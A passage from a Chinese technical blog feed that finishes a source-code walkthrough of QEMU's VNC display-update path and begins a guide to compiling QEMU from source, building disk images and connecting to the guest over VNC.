&#125;<br>    <span class="hljs-keyword">if</span> (con-&gt;hw_ops-&gt;gfx_update) &#123;<br>        con-&gt;hw_ops-&gt;gfx_update(con-&gt;hw);<br>        async = con-&gt;hw_ops-&gt;gfx_update_async;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!async) &#123;<br>        graphic_hw_update_done(con);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>前面我们讲到一个 QemuConsole 对应一个显示设备，因此在 <code>graphic_hw_update()</code> 当中会直接调用 <code>con-&gt;hw_ops-&gt;gfx_update()</code> 来完成硬件方面的数据更新</p><p>如果是纯字符型显示设备，则为 <code>text_console_ops</code>，定义于 <code>ui/console.c</code> 中，该函数表没有 <code>gfx_update</code> 指针，故会直接返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> GraphicHwOps text_console_ops = &#123;<br>    .invalidate  = text_console_invalidate,<br>    .text_update = text_console_update,<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于默认的图形化界面，<code>con-&gt;hw-&gt;ops</code> 应为 <code>vga_ops</code>，定义于 <code>hw/display/vga.c</code> 中，其 <code>gfx_update</code> 指针为 <code>vga_update_display</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> GraphicHwOps vga_ops = &#123;<br>    .invalidate  = vga_invalidate_display,<br>    .gfx_update  = vga_update_display,<br>    .text_update = vga_update_text,<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>这里主要是根据指定的硬件决定的，默认的图形界面便是 <code>vga_ops</code>，如果你在启动时指定了一个 QXL 显卡，那么这里就应该是 <code>qxl_ops</code>，最终调用到 <code>qxl_hw_update()</code></p></blockquote><p>该函数定义于 <code>hw/display/vga.c</code> 中，主要作用就是根据显示模式调用不同的更新函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vga_update_display</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    VGACommonState *s = opaque;<br>    DisplaySurface *surface = qemu_console_surface(s-&gt;con);<br>    <span class="hljs-type">int</span> full_update, graphic_mode;<br><br>    qemu_flush_coalesced_mmio_buffer();<br><br>    <span class="hljs-keyword">if</span> (surface_bits_per_pixel(surface) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">/* nothing to do */</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        full_update = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (!(s-&gt;ar_index &amp; <span class="hljs-number">0x20</span>)) &#123;<br>            graphic_mode = GMODE_BLANK;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            graphic_mode = s-&gt;gr[VGA_GFX_MISC] &amp; VGA_GR06_GRAPHICS_MODE;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (graphic_mode != s-&gt;graphic_mode) &#123;<br>            s-&gt;graphic_mode = graphic_mode;<br>            s-&gt;cursor_blink_time = qemu_clock_get_ms(QEMU_CLOCK_VIRTUAL);<br>            full_update = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">switch</span>(graphic_mode) &#123;<br>        <span class="hljs-keyword">case</span> GMODE_TEXT:<br>            vga_draw_text(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> GMODE_GRAPH:<br>            vga_draw_graphic(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> GMODE_BLANK:<br>        <span class="hljs-keyword">default</span>:<br>            vga_draw_blank(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这些 <code>vga_draw_*</code> 函数最后都会调用到 <code>dpy_gfx_update()</code> 将更新推送到显示设备上，其定义于 <code>ui/console.c</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">dpy_gfx_update</span><span class="hljs-params">(QemuConsole *con, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> w, <span class="hljs-type">int</span> h)</span><br>&#123;<br>    DisplayState *s = con-&gt;ds;<br>    DisplayChangeListener *dcl;<br>    <span class="hljs-type">int</span> width = qemu_console_get_width(con, x + w);<br>    <span class="hljs-type">int</span> height = qemu_console_get_height(con, y + h);<br><br>    x = MAX(x, <span class="hljs-number">0</span>);<br>    y = MAX(y, <span class="hljs-number">0</span>);<br>    x = MIN(x, width);<br>    y = MIN(y, height);<br>    w = MIN(w, width - x);<br>    h = MIN(h, height - y);<br><br>    <span class="hljs-keyword">if</span> (!qemu_console_is_visible(con)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    dpy_gfx_update_texture(con, con-&gt;surface, x, y, w, h);<br>    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (con != (dcl-&gt;con ? dcl-&gt;con : active_console)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update) &#123;<br>            dcl-&gt;ops-&gt;dpy_gfx_update(dcl, x, y, w, h);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要流程如下：</p><ul><li>若 QemuConsole 不可视，直接返回</li><li>调用 <code>dpy_gfx_update_texture()</code>，其最终会调用到 <code>con-&gt;gl-&gt;ops-&gt;dpy_gl_ctx_update_texture()</code>，这一块是与 GL 相关的操作，这里暂且不展开</li><li>遍历 QemuConsole 上的 DisplayChangeListener，调用 <code>dcl-&gt;ops-&gt;dpy_gfx_update()</code>，更新 dcl 对应的 display 设备</li></ul><p>对于 VNC 而言，<code>dcl-&gt;ops-&gt;dpy_gfx_update</code> 指针应为 <code>vnc_dpy_update()</code> 函数，定义于 <code>ui/vnc.c</code> 中，主要就是调用 <code>vnc_set_area_dirty()</code> 将一块区域标记为 dirty：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vnc_dpy_update</span><span class="hljs-params">(DisplayChangeListener *dcl,</span><br><span class="hljs-params">                           <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> w, <span class="hljs-type">int</span> h)</span><br>&#123;<br>    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncSurface</span> *<span class="hljs-title">s</span> =</span> &amp;vd-&gt;guest;<br><br>    vnc_set_area_dirty(s-&gt;dirty, vd, x, y, w, h);<br>&#125;<br></code></pre></td></tr></table></figure><p>最终这些被标记为 dirty 的区域会在 <code>vnc_refresh()</code> 中调用 <code>vnc_refresh_server_surface()</code> 时被进一步处理，在 <code>vnc_update_client()</code> 中变为新的 VncJob 链到全局链表上</p><h2 id="四、vnc-client-update-创建新的-VncJob-挂载到全局链表上"><a href="#四、vnc-client-update-创建新的-VncJob-挂载到全局链表上" class="headerlink" title="四、vnc_client_update - 创建新的 VncJob 挂载到全局链表上"></a>四、vnc_client_update - 创建新的 VncJob 挂载到全局链表上</h2><p>当前面我们将特定的显示区域标记为 dirty 之后，最终会由 <code>vnc_update_client()</code> 函数来扫描 dirty 区域，并创建相应的 VncJob 挂载到全局的 queue 上，因此最后实际上还是由 vnc worker thread 完成推送的任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vnc_update_client</span><span class="hljs-params">(VncState *vs, <span class="hljs-type">int</span> has_dirty)</span><br>&#123;<br>    VncDisplay *vd = vs-&gt;vd;<br>    VncJob *job;<br>    <span class="hljs-type">int</span> y;<br>    <span class="hljs-type">int</span> height, width;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (vs-&gt;disconnecting) &#123;<br>        vnc_disconnect_finish(vs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    vs-&gt;has_dirty += has_dirty;<br>    <span class="hljs-keyword">if</span> (!vnc_should_update(vs)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!vs-&gt;has_dirty &amp;&amp; vs-&gt;update != VNC_STATE_UPDATE_FORCE) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Send screen updates to the vnc client using the server</span><br><span class="hljs-comment">     * surface and server dirty map.  guest surface updates</span><br><span class="hljs-comment">     * happening in parallel don&#x27;t disturb us, the next pass will</span><br><span class="hljs-comment">     * send them to the client.</span><br><span class="hljs-comment">     */</span><br>    job = vnc_job_new(vs);  <span class="hljs-comment">// 创建新的 VncJob</span><br><br>    height = pixman_image_get_height(vd-&gt;server);<br>    width = pixman_image_get_width(vd-&gt;server);<br><br>    y = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">// 扫描 dirty 区域</span><br>        <span class="hljs-type">int</span> x, h;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> x2;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset = find_next_bit((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *) &amp;vs-&gt;dirty,<br>                                             height * VNC_DIRTY_BPL(vs),<br>                                             y * VNC_DIRTY_BPL(vs));<br>        <span class="hljs-keyword">if</span> (offset == height * VNC_DIRTY_BPL(vs)) &#123;<br>            <span class="hljs-comment">/* no more dirty bits */</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        y = offset / VNC_DIRTY_BPL(vs);<br>        x = offset % VNC_DIRTY_BPL(vs);<br>        x2 = find_next_zero_bit((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *) &amp;vs-&gt;dirty[y],<br>                                VNC_DIRTY_BPL(vs), x);<br>        bitmap_clear(vs-&gt;dirty[y], x, x2 - x);<br>        h = find_and_clear_dirty_height(vs, y, x, x2, height);<br>        x2 = MIN(x2, width / VNC_DIRTY_PIXELS_PER_BIT);<br>        <span class="hljs-keyword">if</span> (x2 &gt; x) &#123;<br>            <span class="hljs-comment">// 创建新的 VncRect，挂载到 VncJob 上</span><br>            n += vnc_job_add_rect(job, x * VNC_DIRTY_PIXELS_PER_BIT, y,<br>                                  (x2 - x) * VNC_DIRTY_PIXELS_PER_BIT, h);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!x &amp;&amp; x2 == width / VNC_DIRTY_PIXELS_PER_BIT) &#123;<br>            y += h;<br>            <span class="hljs-keyword">if</span> (y == height) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    vs-&gt;job_update = vs-&gt;update;<br>    vs-&gt;update = VNC_STATE_UPDATE_NONE;<br>    vnc_job_push(job);  <span class="hljs-comment">// 挂载到全局 queue 上</span><br>    vs-&gt;has_dirty = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，Qemu 中 VNC 的工作流程基本分析完毕</p><h1 id="0xFF-总览"><a href="#0xFF-总览" class="headerlink" title="0xFF.总览"></a>0xFF.总览</h1><p>最后让我们重新看一下 Qemu VNC 的基本架构，这里再放一张从<a href="https://zhuanlan.zhihu.com/p/69568087">知乎</a>上偷来的一个 Qemu VNC 的基本架构图：</p><p><img src="https://s2.loli.net/2022/07/21/7BcC1jzxESl3ZWt.png" alt="image.png"></p><p>在 Qemu 中内部的显示结构如下图所示：</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><p>最终的更新调用链路则如下所示：</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;vnc，🐕都不用&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
    <category term="虚拟化" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="VNC" scheme="http://blog.arttnba3.cn/tags/VNC/"/>
    
  </entry>
  
  <entry>
    <title>【VIRT.0x00】Qemu - I：Qemu 简易食用指南</title>
    <link href="http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/"/>
    <id>http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/</id>
    <published>2022-07-15T08:45:17.000Z</published>
    <updated>2022-08-28T21:13:10.982Z</updated>
    
    <content type="html"><![CDATA[<p>不如 VMWare👋</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>Qemu 是一款开源的虚拟机软件，支持多种不同架构的模拟（Emulation）以及配合 kvm 完成当前架构的虚拟化（Virtualization）的特性，是当前最火热的开源虚拟机软件</p><p><img src="https://s2.loli.net/2022/07/22/jfIDUCx5ZtMsHAY.png" alt="image.png"></p><p>Qemu 的基本运行架构如下图所示：</p><p><img src="https://s2.loli.net/2022/07/26/9L7HtFUQlyZdwXD.png" alt="image.png"></p><p>本篇文章笔者将简要叙述如何从源码编译特定架构的 Qemu 并进行一定程度的改造工作</p><h2 id="PRE-安装依赖"><a href="#PRE-安装依赖" class="headerlink" title="PRE.安装依赖"></a>PRE.安装依赖</h2><p>大概需要安装这些依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt -y install ninja-build build-essential zlib1g-dev pkg-config libglib2.0-dev binutils-dev libpixman-1-dev libfdt-dev</span><br></code></pre></td></tr></table></figure><h1 id="0x01-从源码编译-QEMU"><a href="#0x01-从源码编译-QEMU" class="headerlink" title="0x01.从源码编译 QEMU"></a>0x01.从源码编译 QEMU</h1><h2 id="一、获取-QEMU-源码"><a href="#一、获取-QEMU-源码" class="headerlink" title="一、获取 QEMU 源码"></a>一、获取 QEMU 源码</h2><p>大概有两种途径：从官网下载或是直接从 Qemu 的GitHub 仓库拉下来。</p><h3 id="I-官网下载源码"><a href="#I-官网下载源码" class="headerlink" title="I.官网下载源码"></a>I.官网下载源码</h3><p>前往 <a href="https://download.qemu.org/">qemu 的官网</a>进行下载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://download.qemu.org/qemu-7.0.0.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -xf qemu-7.0.0.tar.xz</span><br></code></pre></td></tr></table></figure><h3 id="II-GitHub-获取源码"><a href="#II-GitHub-获取源码" class="headerlink" title="II. GitHub 获取源码"></a>II. GitHub 获取源码</h3><p>直接从 <a href="https://github.com/qemu/qemu">GitHub</a> 上面拉也行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> git@github.com:qemu/qemu.git</span><br></code></pre></td></tr></table></figure><h2 id="二、配置编译选项"><a href="#二、配置编译选项" class="headerlink" title="二、配置编译选项"></a>二、配置编译选项</h2><p>接下来创建 build 目录并配置对应的编译选项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> build</span><br><span class="hljs-meta prompt_">build$ </span><span class="language-bash">../qemu-7.0.0/configure --enable-kvm --target-list=x86_64-softmmu --enable-debug</span><br></code></pre></td></tr></table></figure><p>这里我们手动指定了这几个编译选项：</p><ul><li><code>--enable-kvm</code>：开启 kvm 支持</li><li><code>--target-list=&lt;架构名&gt;</code>：指定要编译的 CPU 架构，这里我们指定为 <code>x86_64-softmmu</code> 即表示我们要编译 x86 架构的 64位 CPU</li><li><code>--enable-debug</code>：能够对 Qemu 进行调试</li></ul><blockquote><p>如果我们不指定的话会把所有架构都编译一遍，不过这里笔者只需要 x86 的；）</p></blockquote><h2 id="三、开始编译"><a href="#三、开始编译" class="headerlink" title="三、开始编译"></a>三、开始编译</h2><p>直接 make 就完事了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><p>需要花的时间还是不短的，在笔者的小破服务器上编译大概需要十几分钟左右，大概编译了两千多个文件，完成之后在当前目录下就会有一个热乎乎的可执行文件 <code>qemu-system_x86-64</code>，这个就是 Qemu 的本体了</p><p>之后可以 make install 给他安到 bin 里边，这样就能直接从命令行启动了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">sudo make install</span><br></code></pre></td></tr></table></figure><h1 id="0x02-构建系统镜像并使用-vnc-连接"><a href="#0x02-构建系统镜像并使用-vnc-连接" class="headerlink" title="0x02.构建系统镜像并使用 vnc 连接"></a>0x02.构建系统镜像并使用 vnc 连接</h1><p>空有一个 <code>qemu</code> 的可执行文件还不行，我们最终还是要在 qemu 上面跑一个完整的操作系统的，那么这里有两种方法：</p><ul><li>使用 <code>qemu-img</code> 创建虚拟机镜像文件，通过 <code>-cdrom</code> 参数指定载入一个 ISO 镜像文件来安装一个现有的操作系统</li><li>使用 <code>debootstrap</code> 创建 ext4 硬盘镜像，并直接运行一个现成的裸的内核镜像文件（bzImage）</li></ul><h2 id="一、创建虚拟机镜像文件并通过-CDROM-安装-Ubuntu"><a href="#一、创建虚拟机镜像文件并通过-CDROM-安装-Ubuntu" class="headerlink" title="一、创建虚拟机镜像文件并通过 CDROM 安装 Ubuntu"></a>一、创建虚拟机镜像文件并通过 CDROM 安装 Ubuntu</h2><h3 id="I-使用-qemu-img-创建虚拟机磁盘镜像文件"><a href="#I-使用-qemu-img-创建虚拟机磁盘镜像文件" class="headerlink" title="I.使用 qemu-img 创建虚拟机磁盘镜像文件"></a>I.使用 <code>qemu-img</code> 创建虚拟机磁盘镜像文件</h3><p>这一步比较简单，主要是用 <code>build</code> 目录下的 <code>qemu-img</code> 来完成构建：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./build/qemu-img create -f qcow2 test.qcow2 20G</span><br>Formatting &#x27;test.qcow2&#x27;, fmt=qcow2 cluster_size=65536 extended_l2=off compression_type=zlib size=21474836480 lazy_refcounts=off refcount_bits=16<br></code></pre></td></tr></table></figure><p>这里的 <code>-f</code> 参数指定的第一个参数为镜像格式，这里使用 QEMU 最通用的格式 <code>qcow2</code>；第二个参数为文件路径；第三个参数为镜像大小</p><blockquote><p>参见<a href="https://docs.fedoraproject.org/zh-CN/Fedora/12/html/Virtualization_Guide/sect-Virtualization_Guide-Tips_and_tricks-Using_qemu_img.html">这里</a></p></blockquote><h3 id="II-通过-vnc-连接完成安装"><a href="#II-通过-vnc-连接完成安装" class="headerlink" title="II.通过 vnc 连接完成安装"></a>II.通过 vnc 连接完成安装</h3><p>在 qemu 启动时通过 <code>-cdrom</code> 参数可以指定加载的ISO文件路径，这里笔者选择安装一个 Ubuntu 22.04：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./build/qemu-system-x86_64 -m 2G -drive format=qcow2,file=test.qcow2 -enable-kvm -cdrom ~/Download/ubuntu-22.04-desktop-amd64.iso</span><br>VNC server running on ::1:5900<br></code></pre></td></tr></table></figure><p>参数说明如下：</p><ul><li><code>-m</code>：虚拟机的内存大小</li><li><code>-drive</code> ：qemu 启动时额外加载的设备，这里我们使用 <code>format=qcow2,file=test.qcow2</code> 指定了加载设备 <code>test.qcow2</code>、格式为 <code>qcow2</code></li><li><code>-enable-kvm</code> ：启用 kvm 模式，需要注意的是该选项<strong>要求以 root 权限运行</strong></li><li><code>-cdrom</code>：指定 qemu 启动时装载的光碟文件路径</li></ul><p>启动后 qemu 默认会在 5900 端口启动一个 VNC server，此时我们便能通过 VNC 连接到 qemu 上，需要注意的是这里<strong>只能在本地进行连接</strong></p><p>如果是运行在远程服务器上的话，我们还需要额外指定 <code>-vnc</code> 参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./build/qemu-system-x86_64 -m 2G -drive format=qcow2,file=test.qcow2 -enable-kvm -cdrom ~/Download/ubuntu-22.04-desktop-amd64.iso -vnc yourip:0</span><br></code></pre></td></tr></table></figure><p>需要注意的是 <code>vnc</code> 参数中 ip 后面跟着的不是端口号，而是 <code>display numer</code>，对于默认的 <code>display 0</code> 而言其监听的端口号为 <code>5900</code>，而 <code>display 1</code> 就是 <code>5901</code> 端口，以此类推</p><p>之后我们便能通过 vnc 连接上远程服务器上的 qemu 了，这里笔者选择使用 <code>VNC Viewer</code> 进行连接：</p><p><img src="https://s2.loli.net/2022/07/11/3juM5iAgFERhYsS.png" alt="image.png"></p><p>成功连接上远程服务器上的 qemu：</p><p><img src="https://s2.loli.net/2022/07/11/UdlOA6DGaPFJqx2.png" alt="image.png"></p><p>之后就是常规的安装流程了，不过可能是由于 qemu 模拟显卡的问题（或者是 VNC 配置的问题），在一开始的时候安装界面的颜色会有点失真：</p><p><img src="https://s2.loli.net/2022/07/11/lsp4rnZqSdbcIGL.png" alt="image.png"></p><p>不过在安装准备结束的时候又恢复正常的颜色了，笔者目前推测应该是和显卡驱动有关：</p><p><img src="https://s2.loli.net/2022/07/11/g5jCb8yzmQYsvMd.png" alt="image.png"></p><p>之后就和正常使用虚拟机没有什么区别了，下次再次启动就不需要指定 <code>-cdrom</code> 参数了</p><p><img src="https://s2.loli.net/2022/07/11/WZiEx6vqnYapdl7.png" alt="image.png"></p><h2 id="二、构建-ext4-磁盘镜像并运行-kernel-bzImage"><a href="#二、构建-ext4-磁盘镜像并运行-kernel-bzImage" class="headerlink" title="二、构建 ext4 磁盘镜像并运行 kernel bzImage"></a>二、构建 ext4 磁盘镜像并运行 kernel bzImage</h2><p>如果你不需要一个完整的发行版 Linux 系统环境，只是想跑一个裸的简易的内核，也可以通过下面的方式完成：</p><h3 id="I-构建磁盘镜像"><a href="#I-构建磁盘镜像" class="headerlink" title="I.构建磁盘镜像"></a>I.构建磁盘镜像</h3><p>这里我们使用 <code>debootstrap</code> 来创建ext4硬盘镜像，直接使用由 Google 团队为 syzkaller 构建磁盘镜像的脚步即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install debootstrap</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> image</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> image</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x create-image.sh</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash">./create-image.sh</span><br></code></pre></td></tr></table></figure><p>完成之后在当前目录下就会有一个热乎乎的 <code>stretch.img</code>，这便是 ext4 磁盘镜像文件了</p><blockquote><p>wget 的这一步<strong>需要翻墙</strong>（<code>raw.githubusercontent.com</code> 在国内似乎是被墙了，总之笔者记忆里从没成功在不翻墙的情况下成功上去过），若嫌麻烦可以直接 copy <a href="/download/create-image.sh">笔者已经下好的</a></p></blockquote><h3 id="II-获取-kernel-bzImage"><a href="#II-获取-kernel-bzImage" class="headerlink" title="II.获取 kernel bzImage"></a>II.获取 kernel bzImage</h3><p>这部分参见<a href="http://arttnba3.cn/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II/#0x01-%E8%8E%B7%E5%8F%96%E5%86%85%E6%A0%B8%E9%95%9C%E5%83%8F%EF%BC%88bzImage%EF%BC%89">这里</a></p><h3 id="III-运行-qemu-并通过-vnc-进行连接"><a href="#III-运行-qemu-并通过-vnc-进行连接" class="headerlink" title="III.运行 qemu 并通过 vnc 进行连接"></a>III.运行 qemu 并通过 vnc 进行连接</h3><p>创建如下 bash 脚本并运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span 